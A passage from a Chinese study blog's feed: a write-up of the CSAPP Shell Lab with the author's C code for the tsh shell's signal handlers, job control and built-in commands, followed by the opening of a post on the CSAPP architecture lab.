shell.</p><p>– The jobs command lists all background jobs.</p><p>– The bg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the background. The <job> argument can be either a PID or a JID.</p><p>– The fg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the foreground. The <job> argument can be either a PID or a JID.</p><p>• tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></blockquote><p>用人话讲就是：</p><ul><li>每次要以<code>tsh&gt;</code>开始,这个prompt他会提前提供给你</li><li>每次命令行只有两种类别可能性，一种是内置命令要运行builtin_cmd函数处理quit，jobs，bg和fg命令，同时不用处理单独的<code>&amp;</code>命令，一种是运行程序，使用exevc函数+参数</li><li>不需要管道和I&#x2F;O</li><li>ctrl-c和ctrl-z只对前台进程fg管用，分别是对前台进程进行终止和挂起，即为stoped和terminaled</li><li>如果命令以<code>&amp;</code>结尾，则默认是后台进程</li><li>要有JID和PID的区分，jid为一个组的id，而pid则是每个进程的id</li><li>需要支持以下内置命令<ol><li>quit：关闭结束shell</li><li>jobs：列出所有后台任务</li><li>bg</li><li>fg</li></ol></li><li>tsh 应该回收所有的僵尸进程，如果任何 job 因为接收了没有 catch 的信号而终止，tsh 应该识别出这个时间并且打印出 JID 和相关信号的信息</li></ul><blockquote><p>做这个lab的时候已经离读完本章过了七八天了，好像又忘得差不多了，真的很烦拉锯战。现在已经很多代码都看不懂了</p></blockquote><h1 id="Lab摸索"><a href="#Lab摸索" class="headerlink" title="Lab摸索"></a>Lab摸索</h1><p>我们归根结底是要对<code>tsh.c</code>这个文件进行修改，让他起到一个shell的作用，我们只用不全eval那几个函数，一开始我们运行下tsh，输入<code>./tsh</code>会进入死循环，每次键入没有反应，阅读代码得知<code>ctrl-d</code>能结束程序。而tshref便是模范程序，tshref.out便是模范输出，我们照着trace文件序号从小到大一个一个实现就可以了，开工！</p><h2 id="错误处理包装函数"><a href="#错误处理包装函数" class="headerlink" title="错误处理包装函数"></a>错误处理包装函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">pid_t</span> <span class="token function">Fork</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> environ<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Kill</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">int</span> signum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Sigemptyset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Sigaddset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token keyword">int</span> signum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Sigfillset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Setpgid</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">pid_t</span> pgid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Sigprocmask</span><span class="token punctuation">(</span><span class="token keyword">int</span> how<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>oldset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">Sigsuspend</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pid_t</span> <span class="token function">Fork</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> pid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> environ<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Command not found.\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Kill</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">int</span> signum<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> signum<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Kill error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Sigemptyset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sigemptyset</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Sigemptyset error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Sigaddset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token keyword">int</span> sign<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sigaddset</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> sign<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Sigaddset error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Sigprocmask</span><span class="token punctuation">(</span><span class="token keyword">int</span> how<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>oldset<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>how<span class="token punctuation">,</span> set<span class="token punctuation">,</span> oldset<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Sigprocmask error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Sigfillset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sigfillset</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Sigfillset error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Setpgid</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">pid_t</span> pgid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setpgid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> pgid<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Setpgid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">Sigsuspend</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">sigsuspend</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* always returns -1 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">!=</span> EINTR<span class="token punctuation">)</span>        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"Sigsuspend error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rc<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h2><h3 id="SIGCHLD-handler"><a href="#SIGCHLD-handler" class="headerlink" title="SIGCHLD_handler"></a>SIGCHLD_handler</h3><p>在这个函数里面我们要处理<code>SIGCHLD</code>这个信号</p><blockquote><p>sigchld_handler - 每当子作业终止（变成僵尸）或因收到 SIGSTOP 或 SIGTSTP 信号而停止时，内核都会向 shell 发送 SIGCHLD。处理程序会获取所有可用的僵尸子级，但不会等待任何其他当前正在运行的子级终止。</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> olderrno<span class="token operator">=</span>errno<span class="token punctuation">;</span><span class="token comment">//负责保存错误信息，errno是全局变量</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span>prev_all<span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job<span class="token punctuation">;</span>    <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//阻塞所有信号</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid<span class="token operator">=</span><span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>status<span class="token punctuation">,</span>WNOHANG<span class="token operator">|</span>WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//当有进程终止/停止的时候都会获得那个进程的pid</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev_all<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//分别通过三种状态来判断是正常结束还是terminated还是stopped</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) stoped by signal %d\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WSTOPSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            job<span class="token operator">-></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev_all<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解除所有阻塞</span>           <span class="token punctuation">&#125;</span>    errno<span class="token operator">=</span>olderrno<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SIGINT-handler"><a href="#SIGINT-handler" class="headerlink" title="SIGINT_handler"></a>SIGINT_handler</h3><p>当接收到这个信号时，需要对所有在前台运行的进程将其状态变为STOP，通过kill函数来实现,即通过fgpid函数得到当前jobs中在前台的job的pid，然后把这个进程组kill掉，write_up中告诉我们使用kill函数时要用<code>-pid</code>来kill掉一整个进程组</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void sigint_handler(int sig) &#123;    int pid;    int olderrno&#x3D;errno;    sigset_t mask_all,prev_all;    sigfillset(&amp;mask_all);    sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);    if((pid&#x3D;(fgpid(jobs)))!&#x3D;0)&#123;        sigprocmask(SIG_SETMASK,&amp;prev_all,NULL);        kill(-pid,SIGINT);    &#125;    errno&#x3D;olderrno;    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SIGTSTP-handler"><a href="#SIGTSTP-handler" class="headerlink" title="SIGTSTP_handler"></a>SIGTSTP_handler</h3><p>这个和接受到sigint信号的函数差别不大</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void sigtstp_handler(int sig) &#123;    int pid;    int olderrno&#x3D;errno;    sigset_t mask_all,prev_all;    sigfillset(&amp;mask_all);    sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);    if((pid&#x3D;(fgpid(jobs)))&gt;0)&#123;        sigprocmask(SIG_SETMASK,&amp;prev_all,NULL);        kill(-pid,SIGTSTP);    &#125;    errno&#x3D;olderrno;    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><p>阻塞所有的进程，直到前台进程结束&#x2F;被终止&#x2F;停止</p><p>用<code>sigsuspend</code>函数，这个函数相当于如下代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在调用<code>sigsuspend</code>之前阻塞 SIGCHLD 信号，调用时又通过<code>sigprocmask</code>函数，在执行<code>pause</code>函数之前解除对信号的阻塞，从而正常休眠。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void waitfg(pid_t pid)&#123;       sigset_t mask;    sigemptyset(&amp;mask);    while(fgpid(jobs)!&#x3D;0)&#123;        sigsuspend(&amp;mask);    &#125;    return ;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>总函数，贯穿对cmdline命令处理的调控，安排</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void eval(char *cmdline) &#123;    &#x2F;&#x2F;主线程，负责调控诸多函数    char *argv[MAXARGS];    char buf[MAXLINE];    int bg ;    pid_t pid;    sigset_t mask_all,prev_all,mask_one;    &#x2F;&#x2F;阻塞信号    sigfillset(&amp;mask_all);    sigemptyset(&amp;mask_one);    sigaddset(&amp;mask_one,SIGCHLD);   sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);&#x2F;&#x2F;防止出现子进程比父进程先的情况    &#x2F;&#x2F;在课本里有    strcpy(buf,cmdline);&#x2F;&#x2F;cmdline复制过来    bg&#x3D;parseline(buf,argv);&#x2F;&#x2F;负责根据空格把buf中的字符划分丢到argv的数组中    &#x2F;&#x2F;bg&#x3D;1 则在后台执行        if(argv[0]&#x3D;&#x3D;NULL)return ;&#x2F;&#x2F;没有命令，不处理    if(!builtin_cmd(argv)) &#123;&#x2F;&#x2F;如果不是builtin_cmd，则创立新的子进程            if((pid&#x3D;fork())&#x3D;&#x3D;0)&#123;            sigprocmask(SIG_SETMASK,&amp;prev_all,NULL);            setpgid(0,0);&#x2F;&#x2F;进程组            if(execve(argv[0],argv,environ)&lt;0)            &#123;                printf(&quot;%s: Command not found.\n&quot;, argv[0]);                exit(0);            &#125;        &#125;        &#x2F;&#x2F;注意子进程不继承父进程的局部变量，故下面的函数段在子进程中直接判定为假。       &#x2F;&#x2F;父进程        if(!bg)&#123;&#x2F;&#x2F;前台执行            addjob(jobs,pid,FG,cmdline);          sigprocmask(SIG_SETMASK,&amp;mask_one,NULL);            waitfg(pid);        &#125;        else &#123;&#x2F;&#x2F;后台执行            addjob(jobs,pid,BG,cmdline);            sigprocmask(SIG_SETMASK,&amp;mask_one,NULL);            printf(&quot;[%d] (%d) %s&quot;,pid2jid(pid),pid,cmdline);                  &#125;        sigprocmask(SIG_SETMASK,&amp;prev_all,NULL);   return ;    &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h2><p>这个很简单，就判断是不是那四个内置命令，是的话就调用对应的函数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int builtin_cmd(char **argv) &#123;  if(!strcmp(argv[0],&quot;quit&quot;))  exit(0);   if(!strcmp(argv[0],&quot;&amp;&quot;))  return 1;   if(!strcmp(argv[0],&quot;bg&quot;)||!strcmp(argv[0],&quot;fg&quot;))  &#123;    do_bgfg(argv);  return 1;  &#125;  if (!strcmp(argv[0],&quot;jobs&quot;))&#123;    listjobs(jobs); return 1;  &#125;  else      return 0;     &#x2F;* not a builtin command *&#x2F;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><ul><li><p>The bg <job> command restarts <job> by sending it a SIGCONT signal,<br>and then runs it in the background.<br>The <job> argument can be either a PID or a JID.</p></li><li><p>The fg <job> command restarts <job> by sending it a SIGCONT signal,<br>and then runs it in the foreground. </p></li><li><p>The <job> argument can be either a PID or a JID.</p><p>这个函数主要是根据test14案例进行修改补充</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void do_bgfg(char **argv) &#123;    &#x2F;&#x2F;后台执行    struct job_t *job&#x3D;NULL;    int state;    int id;    if(!strcmp(argv[0],&quot;bg&quot;))state&#x3D;BG;    else state &#x3D;FG;   if(argv[1]&#x3D;&#x3D;NULL)&#123;        printf(&quot;%s command requires PID or %%jobid argument\n&quot;,argv[0]);        return ;    &#125;&#x2F;&#x2F;判断是不是只有fg&#x2F;bg这种命令    if(argv[1][0]&#x3D;&#x3D;&#39;%&#39;)&#123;&#x2F;&#x2F;jid的情况        if(sscanf(&amp;argv[1][1],&quot;%d&quot;,&amp;id)&gt;0)&#123;            job&#x3D;getjobjid(jobs,id);            if(job&#x3D;&#x3D;NULL)&#123;                printf(&quot;%s: No such job\n&quot;,argv[1]);                return ;            &#125;        &#125;    &#125;      else if(!isdigit(argv[1][0])) &#123;  &#x2F;&#x2F;其它符号，非法输入，不是数字的情况        printf(&quot;%s: argument must be a PID or %%jobid\n&quot;, argv[0]);        return;    &#125;    else &#123;&#x2F;&#x2F;pid的情况，直接把字符串转化成数字床，通过atoi函数        id&#x3D;atoi(argv[1]);        job&#x3D;getjobpid(jobs,id);        if(job&#x3D;&#x3D;NULL)&#123;            printf(&quot;(%d): No such process\n&quot;,id);            return;        &#125;            &#125;    kill(-(job-&gt;pid),SIGCONT);&#x2F;&#x2F;统一把他们的状态都定义成SIGCONT    job-&gt;state&#x3D;state;    if(state&#x3D;&#x3D;BG)&#x2F;&#x2F;根据状态的不同调整输出        printf(&quot;[%d] (%d) %s&quot;,job-&gt;jid,job-&gt;pid,job-&gt;cmdline);    else         waitfg(job-&gt;pid);        return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个shell lab没有具体的评分系统，每次都是通过以下两个命令</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">make test01make rtest01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种类似的命令来比对1-16个trace文件，而且这个shell是模拟一个shell，故不能通过对拍来判断程序是否正确，因为进程号都不一样，而且这个lab是我学习完课本后放了一个超级长的五一假期然后磨磨蹭蹭做完的，而且抄了大量的别人的代码，只能说这个lab做的有点失败，而且没有进行错误处理包装，错误处理函数是直接复制的，但是还是学到了很多东西。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zhuanlan.zhihu.com/p/492645370">CSAPP | Lab7-Shell Lab 深入解析 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/667470667">CSAPP shelllab解析 - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
            <tag> ECF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab4-archlab</title>
      <link href="/2024/03/14/lab4/"/>
      <url>/2024/03/14/lab4/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong><del>是个屁的邂逅</del></strong>.</p><p>为什么这个lab做的时间比cachelab要晚呢?主要是我看小土刀只做了7个lab,然后我又不想看chapter4,导读也说不用看我直接就跳了.谁知道做完cachelab后我把做好的lab一上传,发现我库里有8个lab,然后找到了<a href="https://csapp.cs.cmu.edu/3e/labs.html">lab assignment</a>,原来我直接把这个lab给忽略了,所以呀,现在要掉头回来干这个lab.</p></blockquote><p>照例给出一些链接,减少大家搜资料的时间成本.(来源于cmu)</p><ul><li><p><a href="http://csapp.cs.cmu.edu/3e/README-archlab">ReadMe</a></p></li><li><p><a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf">Writeup</a></p></li><li><p><a href="http://csapp.cs.cmu.edu/3e/buflab32-handout.tar">Selfstudy handout</a></p></li></ul><h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>我们要做Part A,B,C,其中A和B是C的基础,pdf里面说A和B比较简单,C比较难</p><p>Y86_64常用指令集</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004832.png" alt="image-20240314230447240"></p><ul><li>irmovq指令表示将一个<strong>立即数</strong>存进一个<strong>寄存器</strong>中 